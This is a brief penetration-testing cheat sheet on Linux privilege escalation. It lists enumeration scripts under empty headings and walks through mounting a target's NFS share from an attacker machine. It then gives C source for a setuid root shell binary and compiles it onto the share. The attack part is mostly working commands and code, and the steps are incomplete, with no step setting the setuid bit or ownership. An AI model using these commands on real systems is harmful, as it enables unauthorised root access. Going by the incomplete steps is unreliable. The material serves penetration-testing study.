# Linux Privilege Escalation
This cheat sheet covers a flow chart methodology to test privilege escalation for Linux systems.
## Tools and Scans
We can use simple scripts to do a lot of leg work for us when trying to identify a privilege escalation vulnerability.
### LinuxPrivCheck.py

### LinEnum.sh

## Mounted Filesystems with SetUID
Is there perhaps a mounted NFS share that we can mount remotely? Maybe one with the mount options of setuid 0? 
```
root@attacker-machine:~# mkdir /mnt/nfs
root@attacker-machine:~# mount -t nfs (TARGET IP ADDRESS)/path/to/nfs /mnt/nfs -o nolock
```
Then, compile a binary that spawns a shell, such as,
```
#include<stdlib.h>
#include<stdio.h>
#include<unistd.h>
int main(void){
 setuid(0);
 setgid(0);
 system("/bin/bash");
 return 0;
}
```
Compile it so that the binary is on the mounted NFS share and run it,
```
root@attacker-machine:/mnt/nfs:# gcc execute.c -m32 -o execute
```
